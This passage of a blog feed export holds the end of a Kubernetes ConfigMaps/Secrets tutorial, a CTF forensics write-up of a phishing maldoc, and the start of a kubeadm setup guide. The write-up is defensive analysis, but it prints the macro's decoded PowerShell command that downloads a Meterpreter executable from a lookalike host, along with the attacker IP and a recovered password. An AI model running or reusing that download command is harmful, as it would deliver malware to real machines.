class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">database-secret</span></span><br><span class=\"line\"><span class=\"attr\">type:</span> <span class=\"string\">Opaque</span></span><br><span class=\"line\"><span class=\"attr\">data:</span></span><br><span class=\"line\">  <span class=\"attr\">postgres-pass:</span> <span class=\"string\">&quot;bW9oYW1lZA==&quot;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"create-the-configmaps-object-2\"><a class=\"markdownIt-Anchor\" href=\"#create-the-configmaps-object-2\">#</a> Create the ConfigMaps Object:</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">justk8s@justk8s-master:~$ kubectl apply -f first-secret.yaml</span><br><span class=\"line\">secret/database-secret created</span><br></pre></td></tr></table></figure>\n<h4 id=\"list-the-configmap-objects-2\"><a class=\"markdownIt-Anchor\" href=\"#list-the-configmap-objects-2\">#</a> List the ConfigMap Objects:</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">justk8s@justk8s-master:~$ kubectl get secrets</span><br><span class=\"line\">NAME                  TYPE                                  DATA   AGE</span><br><span class=\"line\">database-secret       Opaque                                1      8s</span><br><span class=\"line\">default-token-xl8sl   kubernetes.io/service-account-token   3      13h</span><br></pre></td></tr></table></figure>\n<h3 id=\"how-to-use-configmaps-and-secrets-values-in-a-pod\"><a class=\"markdownIt-Anchor\" href=\"#how-to-use-configmaps-and-secrets-values-in-a-pod\">#</a> How to use ConfigMaps and Secrets values in a Pod</h3>\n<p>we can use the values from  <code>ConfigMaps</code>  and  <code>Secrets</code>  in the pod manifests in the  <code>env</code>  propriety of the container by using the  <code>valueFrom</code>  field that can import values from configMap and Secrets</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Pod</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">&lt;pod-name&gt;</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">containers:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">&lt;name&gt;</span></span><br><span class=\"line\">      <span class=\"attr\">image:</span> <span class=\"string\">&lt;image&gt;</span></span><br><span class=\"line\">      <span class=\"attr\">env:</span></span><br><span class=\"line\">        <span class=\"comment\"># Define the environment variable</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">&lt;variable-name&gt;</span></span><br><span class=\"line\">          <span class=\"attr\">valueFrom:</span></span><br><span class=\"line\">            <span class=\"attr\">configMapKeyRef:</span></span><br><span class=\"line\">              <span class=\"attr\">name:</span> <span class=\"string\">&lt;config-map-object&gt;</span>     </span><br><span class=\"line\">              <span class=\"attr\">key:</span> <span class=\"string\">&lt;key-name&gt;</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">&lt;variable-name&gt;</span></span><br><span class=\"line\">          <span class=\"attr\">valueFrom:</span></span><br><span class=\"line\">            <span class=\"attr\">secretKeyRef:</span></span><br><span class=\"line\">              <span class=\"attr\">name:</span> <span class=\"string\">&lt;secret-object&gt;</span>     </span><br><span class=\"line\">              <span class=\"attr\">key:</span> <span class=\"string\">&lt;key-name&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"create-a-postgresql-pod-that-uses-values-from-configmaps-and-secrets\"><a class=\"markdownIt-Anchor\" href=\"#create-a-postgresql-pod-that-uses-values-from-configmaps-and-secrets\">#</a> Create a PostgreSQL Pod that uses values from ConfigMaps and Secrets</h3>\n<h4 id=\"1-create-the-pod-manifest\"><a class=\"markdownIt-Anchor\" href=\"#1-create-the-pod-manifest\">#</a> 1- Create the Pod manifest:</h4>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Pod</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">postgresql</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">containers:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">postgres</span></span><br><span class=\"line\">      <span class=\"attr\">image:</span> <span class=\"string\">postgres</span></span><br><span class=\"line\">      <span class=\"attr\">ports:</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">containerPort:</span> <span class=\"number\">5432</span></span><br><span class=\"line\">      <span class=\"attr\">env:</span></span><br><span class=\"line\">        <span class=\"comment\"># Define the environment variable</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">POSTGRES_USER</span></span><br><span class=\"line\">          <span class=\"attr\">valueFrom:</span></span><br><span class=\"line\">            <span class=\"attr\">configMapKeyRef:</span></span><br><span class=\"line\">              <span class=\"attr\">name:</span> <span class=\"string\">config-map</span>   </span><br><span class=\"line\">              <span class=\"attr\">key:</span> <span class=\"string\">postgres-user</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">POSTGRES_DBNAME</span></span><br><span class=\"line\">          <span class=\"attr\">valueFrom:</span></span><br><span class=\"line\">            <span class=\"attr\">configMapKeyRef:</span></span><br><span class=\"line\">              <span class=\"attr\">name:</span> <span class=\"string\">config-map</span>   </span><br><span class=\"line\">              <span class=\"attr\">key:</span> <span class=\"string\">postgres-db</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">POSTGRES_PASSWORD</span></span><br><span class=\"line\">          <span class=\"attr\">valueFrom:</span></span><br><span class=\"line\">            <span class=\"attr\">secretKeyRef:</span></span><br><span class=\"line\">              <span class=\"attr\">name:</span> <span class=\"string\">database-secret</span>   </span><br><span class=\"line\">              <span class=\"attr\">key:</span> <span class=\"string\">postgres-pass</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"2-create-the-pod\"><a class=\"markdownIt-Anchor\" href=\"#2-create-the-pod\">#</a> 2- Create the Pod:</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">justk8s@justk8s-master:~$ kubectl apply -f postgres.yaml</span><br><span class=\"line\">pod/postgresql created</span><br></pre></td></tr></table></figure>\n<h4 id=\"3-list-the-created-pod\"><a class=\"markdownIt-Anchor\" href=\"#3-list-the-created-pod\">#</a> 3- List The Created Pod:</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">justk8s@justk8s-master:~$ kubectl get pods</span><br><span class=\"line\"></span><br><span class=\"line\">NAME         READY   STATUS    RESTARTS   AGE</span><br><span class=\"line\">postgresql   1/1     Running   0          8s</span><br></pre></td></tr></table></figure>\n<h4 id=\"4-test-the-database-created-with-variables-of-configmap-and-secrets\"><a class=\"markdownIt-Anchor\" href=\"#4-test-the-database-created-with-variables-of-configmap-and-secrets\">#</a> 4- Test the Database created with variables of ConfigMap and Secrets:</h4>\n<p>We can open a bash session on the pod and open the database  <code>mohamed</code>  with the  <code>psql</code>  command provided by the postgreSQL</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">justk8s@justk8s-master:~$ kubectl <span class=\"built_in\">exec</span> --stdin --<span class=\"built_in\">tty</span> postgresql  -- /bin/bash</span><br><span class=\"line\"></span><br><span class=\"line\">root@postgresql:/<span class=\"comment\"># psql -U &quot;mohamed&quot;</span></span><br><span class=\"line\">psql (14.4 (Debian 14.4-1.pgdg110+1))</span><br><span class=\"line\">Type <span class=\"string\">&quot;help&quot;</span> <span class=\"keyword\">for</span> <span class=\"built_in\">help</span>.</span><br><span class=\"line\"></span><br><span class=\"line\">mohamed=<span class=\"comment\">#</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"references\"><a class=\"markdownIt-Anchor\" href=\"#references\">#</a> References:</h4>\n<p><em><span class=\"exturl\" data-url=\"aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2RvY3MvdGFza3MvZGVidWcvZGVidWctYXBwbGljYXRpb24vZ2V0LXNoZWxsLXJ1bm5pbmctY29udGFpbmVyLw==\">Get a Shell to a Running Container</span></em></p>\n<p><em><span class=\"exturl\" data-url=\"aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2RvY3MvY29uY2VwdHMvY29uZmlndXJhdGlvbi9jb25maWdtYXAv\">ConfigMaps</span></em></p>\n<p><em><span class=\"exturl\" data-url=\"aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2RvY3MvY29uY2VwdHMvY29uZmlndXJhdGlvbi9zZWNyZXQv\">Secrets</span></em></p>\n<p><em><span class=\"exturl\" data-url=\"aHR0cHM6Ly9odWIuZG9ja2VyLmNvbS9fL3Bvc3RncmVz\">PostgreSQL Docker</span></em></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/09/05/CyberDefenders/Phishy/",
            "url": "http://example.com/2022/09/05/CyberDefenders/Phishy/",
            "title": "CyberDefenders Writeup  Phishy",
            "date_published": "2022-09-05T15:46:09.000Z",
            "content_html": "<p>This CTF challenge is about retrieving data from a disk image, and analyzing a maldoc using oledump.<br>\nThe maldoc download a malware in our victim personal computer! Let’s figure out what is going on!</p>\n<h1 id=\"challenge-information\"><a class=\"markdownIt-Anchor\" href=\"#challenge-information\">#</a> Challenge Information</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>A company’s employee joined a fake iPhone giveaway. Our team took a disk image of the employee’s system for further analysis. As a security analyst, you are tasked to identify how the system was compromised.</p>\n</div></details>\n<p>Challenge Link &amp; Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjA=\" data-background-image=\"https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjA=\">Challenge Link</span>\n          <p class=\"desc\">CyberDefenders - Phishy</p>\n          </div></div><div class=\"item\" title=\"Author - SemahBA\" style=\"--block-color:#de2336;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9CZW5hbGlTZW1haA==\" data-background-image=\"https://pbs.twimg.com/profile_images/1358429186348711936/QRHPcCVi_400x400.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9CZW5hbGlTZW1haA==\">Author - SemahBA</span>\n          <p class=\"desc\">SemahBA Twitter Profile</p>\n          </div></div></div>\n<h1 id=\"walkthrough\"><a class=\"markdownIt-Anchor\" href=\"#walkthrough\">#</a> Walkthrough</h1>\n<p>I use WSL, FTK imager and Registry Explorer</p>\n<blockquote>\n<p>1- What is the hostname of the victim machine?</p>\n</blockquote>\n<p><img data-src=\"https://i.imgur.com/UlU40CE.png\" alt=\"\"><br>\nLet’s check  <code>SYSTEM\\ControlSet001\\Control\\ComputerName\\ComputerName</code>  registry key<br>\n<img data-src=\"https://i.imgur.com/bUMRhhs.png\" alt=\"\"></p>\n<p>Answer:  WIN-NF3JQEU4G0T</p>\n<blockquote>\n<p>2- What is the messaging app installed on the victim machine?</p>\n</blockquote>\n<p><img data-src=\"https://i.imgur.com/vE2xpqz.png\" alt=\"WhatsApp\"><br>\nAnswser: WhatsApp</p>\n<blockquote>\n<p>3- The attacker tricked the victim into downloading a malicious document. Provide the full download URL.</p>\n</blockquote>\n<p>WhatsApp has a database that stores the messages and discussion. Let’s check  <code>\\Users\\Semah\\AppData\\Roaming\\WhatsApp</code> .We find a folder called  <code>Databases</code>  that contains a  <code>db</code>  that can be opened using  <code>DB Browser for SQLite</code> . The messages are stored in  <code>msgstore.db</code> <br>\n<img data-src=\"https://imgur.com/SFlAYTD.png\" alt=\"\"><br>\nWe can open this db file using  <code>DB Browser</code>  and check the  <code>legacy_available_messages_view</code>  table and we will a discussion about IPhone 12 special edition giveaway<br>\n<img data-src=\"https://imgur.com/EGZVAxH.png\" alt=\"\"><br>\nAnswer:  <span class=\"exturl\" data-url=\"aHR0cDovL2FwcEllLmNvbS9JUGhvbmUtV2lubmVycy5kb2M=\">http://appIe.com/IPhone-Winners.doc</span></p>\n<blockquote>\n<p>4- Multiple streams contain macros in the document. Provide the number of the highest stream.</p>\n</blockquote>\n<p>The victim download the word document file. You can find it on  <code>Semah\\Downloads</code>  folder<br>\nLet’s export it from FTK imager and use  <code>oledump</code>  to check the streams in the document<br>\nWe find  <code>Macros/VBA/iphoneevil</code>  the highest stream</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Raf²@4n6nk8s:~$ oledump IPhone-Winners.doc                                                                                       </span><br><span class=\"line\">  1:       114 <span class=\"string\">&#x27;\\x01CompObj&#x27;</span></span><br><span class=\"line\">  2:      4096 <span class=\"string\">&#x27;\\x05DocumentSummaryInformation&#x27;</span></span><br><span class=\"line\">  3:      4096 <span class=\"string\">&#x27;\\x05SummaryInformation&#x27;</span></span><br><span class=\"line\">  4:      8473 <span class=\"string\">&#x27;1Table&#x27;</span></span><br><span class=\"line\">  5:       501 <span class=\"string\">&#x27;Macros/PROJECT&#x27;</span></span><br><span class=\"line\">  6:        68 <span class=\"string\">&#x27;Macros/PROJECTwm&#x27;</span></span><br><span class=\"line\">  7:      3109 <span class=\"string\">&#x27;Macros/VBA/_VBA_PROJECT&#x27;</span></span><br><span class=\"line\">  8:       800 <span class=\"string\">&#x27;Macros/VBA/dir&#x27;</span></span><br><span class=\"line\">  9: M    1170 <span class=\"string\">&#x27;Macros/VBA/eviliphone&#x27;</span></span><br><span class=\"line\"> 10: M    5581 <span class=\"string\">&#x27;Macros/VBA/iphoneevil&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>Answer: 10</p>\n<p>Let’s do some analysis on the macro and the malicious document using the  <code>oletools</code></p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Raf²@4n6nk8s:~$ olevba IPhone-Winners.doc --deobf</span><br><span class=\"line\">olevba IPhone-Winners.doc --deobf                                                                                 ─╯</span><br><span class=\"line\">XLMMacroDeobfuscator: pywin32 is not installed (only is required <span class=\"keyword\">if</span> you want to use MS Excel)</span><br><span class=\"line\">olevba 0.60.1 on Python 3.10.4 - http://decalage.info/python/oletools</span><br><span class=\"line\">===============================================================================</span><br><span class=\"line\">FILE: IPhone-Winners.doc</span><br><span class=\"line\">Type: OLE</span><br><span class=\"line\">-------------------------------------------------------------------------------</span><br><span class=\"line\">VBA MACRO eviliphone.cls</span><br><span class=\"line\"><span class=\"keyword\">in</span> file: IPhone-Winners.doc - OLE stream: <span class=\"string\">&#x27;Macros/VBA/eviliphone&#x27;</span></span><br><span class=\"line\">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br></pre></td></tr></table></figure>\n<p>Scrolling a bit and we find a VBA string variable from the macro that contain base64 cipher, the macro try to execute the decoded<br>\nٍ<img data-src=\"https://imgur.com/bvrf9oR.png\" alt=\"\"><br>\nOK let’s decode it and check what the attacker want to do !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s:~$ <span class=\"built_in\">echo</span> -n <span class=\"string\">&quot;aQBuAHYAbwBrAGUALQB3AGUAYgByAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwBhAHAAcABJAGUALgBjAG8AbQAvAEkAcABoAG8AbgBlAC4AZQB4AGUAJwAgAC0ATwB1AHQARgBpAGwAZQAgACcAQwA6AFwAVABlAG0AcABcAEkAUABoAG8AbgBlAC4AZQB4AGUAJwAgAC0AVQBzAGUARABlAGYAYQB1AGwAdABDAHIAZQBkAGUAbgB0AGkAYQBsAHMA&quot;</span> | <span class=\"built_in\">base64</span> -d</span><br><span class=\"line\"></span><br><span class=\"line\">invoke-webrequest -Uri <span class=\"string\">&#x27;http://appIe.com/Iphone.exe&#x27;</span> -OutFile <span class=\"string\">&#x27;C:\\Temp\\IPhone.exe&#x27;</span> -UseDefaultCredentials</span><br></pre></td></tr></table></figure>\n<p>Wow! The macro try to run an obfuscated  <code>powershell</code>  command that download an executable from  <code>http://appIe.com/Iphone.exe</code>  and save it as   <code>C:\\Temp\\IPhone.exe</code></p>\n<blockquote>\n<p>5- The macro executed a program. Provide the program name?</p>\n</blockquote>\n<p>Answer: Powershell</p>\n<blockquote>\n<p>6- The macro downloaded a malicious file. Provide the full download URL.</p>\n</blockquote>\n<p>Answer: <span class=\"exturl\" data-url=\"aHR0cDovL2FwcEllLmNvbS9JcGhvbmUuZXhl\">http://appIe.com/Iphone.exe</span></p>\n<blockquote>\n<p>7- Where was the malicious file downloaded to? (Provide the full path)</p>\n</blockquote>\n<p>Answer:  C:\\Temp\\IPhone.exe</p>\n<blockquote>\n<p>8- What is the name of the framework used to create the malware?</p>\n</blockquote>\n<p>I am sure that Metasploit is the framework. But let’s make it like we get the points without guessing the answer! OK dude upload the malicious file downloaded to our love  <code>virustotal</code> <br>\n<img data-src=\"https://imgur.com/BKPJ37M.png\" alt=\"\"></p>\n<p>Just google  <code>Meterpreter</code>  and you’ll find that Meterpreter is a Metasploit attack payload that provides an interactive shell</p>\n<p>Ok dude don’t search ! go to  <code>COMMUNITY</code>  tab in  <code>virustotal</code>  and you’ll find comments. You’ll find a metasploit payload detected !</p>\n<p><img data-src=\"https://imgur.com/xuOEWiC.png\" alt=\"\"></p>\n<p>Answer: Metasploit</p>\n<blockquote>\n<p>9- What is the attacker’s IP address?</p>\n</blockquote>\n<p>OK! Now we know that the malicious document download a binary! Of course this binary is a malware.<br>\nWe need to know what is the attacker’s IP address. So let’s do some dynamic analysis. We can do it using either  <code>any.run</code>  or  <code>hybrid-analysis</code> . I will use it both of them just for fun !! Just upload the binary  <code>IPhone.exe</code>  and check the connections !</p>\n<p>ٍ<img data-src=\"https://imgur.com/w04BlMl.png\" alt=\"\" title=\"Using app.run.any\"><br>\nٍ<img data-src=\"https://imgur.com/wNJKnce.png\" alt=\"\" title=\"Using HYBRID ANALYSIS\"></p>\n<p>Answer: 155.94.69.27</p>\n<blockquote>\n<p>10- The fake giveaway used a login page to collect user information. Provide the full URL of the login page?</p>\n</blockquote>\n<p>We find firefox installed in the victim device, Mozilla Firefox browsers stores his history and cookies in  <code>AppData\\Roaming\\Mozilla\\Firefox\\</code> . We can inspect it using SQLite Browser.<br>\nThe most important db file is  <code>places.sqlite</code> . Inspect it and open the  <code>moz_places</code>  database table and check the history of the victim !<br>\n<img data-src=\"https://imgur.com/qbtAcRf.png\" alt=\"\"></p>\n<p>Answer:  <span class=\"exturl\" data-url=\"aHR0cDovL2FwcEllLmNvbXBldGl0aW9ucy5jb20vbG9naW4ucGhw\">http://appIe.competitions.com/login.php</span></p>\n<blockquote>\n<p>11- What is the password the user submitted to the login page?</p>\n</blockquote>\n<p>There is a tool called  <code>Password Fox</code>  that will resolve our problem here !<br>\nPasswordFox is a small password recovery tool that allows you to view the user names and passwords stored by Mozilla Firefox Web browser.<br>\nDownload it from <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmlyc29mdC5uZXQvdXRpbHMvcGFzc3dvcmRmb3guaHRtbA==\">here</span></p>\n<p><img data-src=\"https://imgur.com/pM1lfwD.png\" alt=\"\" title=\"Here is the password\"></p>\n<p>Answer: GacsriicUZMY4xiAF4yl</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/08/05/Kubernetes/kubeadm/",
            "url": "http://example.com/2022/08/05/Kubernetes/kubeadm/",
            "title": "Setting Up Kubernetes with Kubeadm",
            "date_published": "2022-08-05T10:54:12.000Z",
            "content_html": "<p><span class=\"red\">Kubeadm</span> is a tool used to build Kubernetes (K8s) clusters. Kubeadm performs the actions necessary to get a minimum viable cluster up and running quickly. By design, it cares only about bootstrapping, not about provisioning machines (underlying worker and master nodes).</p>\n<div class=\"note success\">\n<p>Knowing how to use kubeadm is required for CKA and CKS exams</p>\n</div>\n<p>We configure a 3 <span class=\"pinky\">Ubuntu 20.04 LTS</span> machines in the same network with the following proprietes:</p>\n<table>\n<thead>\n<tr>\n<th>Role</th>\n<th>Hostname</th>\n<th>IP address</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Master</td>\n<td>4n6nk8s-master</td>\n<td>192.168.1.18/24</td>\n</tr>\n<tr>\n<td>Worker</td>\n<td>4n6nk8s-worker1</td>\n<td>192.168.1.19/24</td>\n</tr>\n<tr>\n<td>Worker</td>\n<td>4n6nk8s-worker2</td>\n<td>192.168.1.20/24</td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p>Note: Make sure to setup a unique hostname for each host</p>\n</blockquote>\n<h2 id=\"prepare-the-environments\"><a class=\"markdownIt-Anchor\" href=\"#prepare-the-environments\">#</a> Prepare the environments</h2>\n<p>The following Steps must be applied to each node (both master nodes and worker nodes)</p>\n<h3 id=\"disable-the-swap-memory\"><a class=\"markdownIt-Anchor\" href=\"#disable-the-swap-memory\">#</a> Disable the Swap Memory</h3>\n<p>The Kubernetes requires that you disable the swap memory in the host system because the kubernetes scheduler determines the best available node on which to deploy newly created pods. If memory swapping is allowed to occur on a host system, this can lead to performance and stability issues within Kubernetes</p>\n<p>You can disable the swap memory by deleting or commenting the swap entry in  <code>/etc/fstab</code>  manually or using the  <code>sed</code>  command</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master$ sudo swapoff -a &amp;&amp; sudo sed -i <span class=\"string\">&#x27;/ swap / s/^\\(.*\\)$/#\\1/g&#x27;</span> /etc/fstab</span><br></pre></td></tr></table></figure>\n<p>This command disbales the swap memory and comments out the swap entry in  <code>/etc/fstab</code></p>\n<h3 id=\"configure-or-disable-the-firewall\"><a class=\"markdownIt-Anchor\" href=\"#configure-or-disable-the-firewall\">#</a> Configure or Disable the firewall</h3>\n<p>When running Kubernetes in an environment with strict network boundaries, such as on-premises datacenter with physical network firewalls or Virtual Networks in Public Cloud, it is useful to be aware of the ports and protocols used by Kubernetes components.</p>\n<p>The ports used by Master Node:</p>\n<table>\n<thead>\n<tr>\n<th>Protocol</th>\n<th>Direction</th>\n<th>Port Range</th>\n<th>Purpose</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>TCP</td>\n<td>Inbound</td>\n<td>6443</td>\n<td>Kubernetes API server</td>\n</tr>\n<tr>\n<td>TCP</td>\n<td>Inbound</td>\n<td>2379-2380</td>\n<td>etcd server client API</td>\n</tr>\n<tr>\n<td>TCP</td>\n<td>Inbound</td>\n<td>10250</td>\n<td>Kubelet API</td>\n</tr>\n<tr>\n<td>TCP</td>\n<td>Inbound</td>\n<td>10259</td>\n<td>kube-scheduler</td>\n</tr>\n<tr>\n<td>TCP</td>\n<td>Inbound</td>\n<td>10257</td>\n<td>kube-controller-manager</td>\n</tr>\n</tbody>\n</table>\n<p>The ports used by Worker Nodes:</p>\n<table>\n<thead>\n<tr>\n<th>Protocol</th>\n<th>Direction</th>\n<th>Port Range</th>\n<th>Purpose</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>TCP</td>\n<td>Inbound</td>\n<td>10250</td>\n<td>Kubelet API</td>\n</tr>\n<tr>\n<td>TCP</td>\n<td>Inbound</td>\n<td>30000-32767</td>\n<td>NodePort Services</td>\n</tr>\n</tbody>\n</table>\n<p>You can either disable the firewall or allow the ports on each node.</p>\n<h4 id=\"method-1-add-firewall-rules-to-allow-the-ports-used-by-the-kubernetes-nodes\"><a class=\"markdownIt-Anchor\" href=\"#method-1-add-firewall-rules-to-allow-the-ports-used-by-the-kubernetes-nodes\">#</a> Method 1: Add firewall rules to allow the ports used by the Kubernetes nodes</h4>\n<p>Allow the ports used by the master node:</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo ufw allow 6443/tcp</span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo ufw allow 2379:2380/tcp</span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo ufw allow 10250/tcp</span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo ufw allow 10259/tcp</span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo ufw allow 10257/tcp</span><br></pre></td></tr></table></figure>\n<p>Allow the ports used by the worker nodes:</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-worker1:~$ sudo ufw allow 10250/tcp</span><br><span class=\"line\">4n6nk8s@4n6nk8s-worker1:~$ sudo ufw allow 30000:32767/tcp</span><br></pre></td></tr></table></figure>\n<h4 id=\"method-2-disable-the-firewall\"><a class=\"markdownIt-Anchor\" href=\"#method-2-disable-the-firewall\">#</a> Method 2: Disable the firewall</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt command</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo ufw status</span><br><span class=\"line\">Status: active</span><br><span class=\"line\"></span><br><span 